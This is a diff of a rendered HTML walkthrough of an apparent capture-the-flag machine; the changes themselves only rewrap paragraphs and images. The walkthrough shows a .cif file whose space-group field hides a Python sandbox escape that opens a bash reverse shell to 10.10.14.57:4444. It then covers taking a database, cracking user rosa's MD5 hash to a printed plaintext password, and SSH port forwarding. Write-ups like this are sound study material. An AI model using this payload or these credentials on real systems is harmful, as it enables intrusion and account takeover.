@@ -316,20 +316,20 @@ loop_
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">_space_group_magn<span style="color:#f92672">.</span>transform_BNS_Pp_abc  <span style="color:#e6db74">&#39;a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+[&#34;__sub&#34; + &#34;classes__&#34;]) () if d.__name__ == &#34;BuiltinImporter&#34;][0].load_module (&#34;os&#34;).system (&#34;/bin/bash -c </span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">sh -i &gt;&amp; /dev/tcp/10.10.14.57/4444 0&gt;&amp;1</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">&#34;);0,0,0&#39;</span>
 _space_group_magn<span style="color:#f92672">.</span>number_BNS  <span style="color:#ae81ff">62.448</span>
 _space_group_magn<span style="color:#f92672">.</span>name_BNS  <span style="color:#e6db74">&#34;P  n&#39;  m  a&#39;  &#34;</span>
-</code></pre></div><p>After uploading the modified .cif file and clicking the &ldquo;view&rdquo; button, a reverse shell connection was established, allowing access to the server.
-<img src="attachment/98544c9579f85dbaff4467d330a40405.png" alt=""></p>
+</code></pre></div><p>After uploading the modified .cif file and clicking the &ldquo;view&rdquo; button, a reverse shell connection was established, allowing access to the server.</p>
+<p><img src="attachment/98544c9579f85dbaff4467d330a40405.png" alt=""></p>
 <p>Once in I browsed trough folders and found a .db file in <strong>/instance</strong>:</p>
 <p><img src="attachment/a07416b7d39814bf65a972ab67ce98cb.png" alt=""></p>
-<p>So copy it and store in local to analyze and the go to <a href="https://inloop.github.io/sqlite-viewer/">https://inloop.github.io/sqlite-viewer/</a> to visualize it:
-<img src="attachment/ae5c718a5452b6ba809d75e9acc8f8bb.png" alt=""></p>
+<p>So copy it and store in local to analyze and the go to <a href="https://inloop.github.io/sqlite-viewer/">https://inloop.github.io/sqlite-viewer/</a> to visualize it:</p>
+<p><img src="attachment/ae5c718a5452b6ba809d75e9acc8f8bb.png" alt=""></p>
 <pre tabindex="0"><code>rosa:63ed86ee9f624c7b14f1d4f43dc251a5
 </code></pre><p>After cracking the MD5 hash on CrackStation, I obtained the following plaintext password:</p>
 <p><img src="attachment/d2fe7632ffcd0ede2092fc06eb355cca.png" alt=""></p>
 <pre tabindex="0"><code>rosa:unicorniosrosados
 </code></pre><h3 id="ssh-access">SSH Access</h3>
 <p>With the cracked credentials, I attempted to establish an SSH connection to the machine as the user rosa. This provided access to additional internal services. Port Forwarding and Service Exploration</p>
-<p>After connecting via SSH, I noticed an internal service running on port 8080, which wasn’t directly exposed externally.
-<img src="attachment/3e53bd91182caf7e0eb31b8d52df7f50.png" alt=""></p>
+<p>After connecting via SSH, I noticed an internal service running on port 8080, which wasn’t directly exposed externally.</p>
+<p><img src="attachment/3e53bd91182caf7e0eb31b8d52df7f50.png" alt=""></p>
 <p><img src="attachment/edc77558fb5d6ae50ac9eabb0bb941b2.png" alt=""></p>
 <p>Using SSH port forwarding, I forwarded this port to my local machine and accessed the web application it hosted.</p>
 <p><img src="attachment/b3d5c6e7ee201e4bc7fb601a08bfba53.png" alt=""></p>
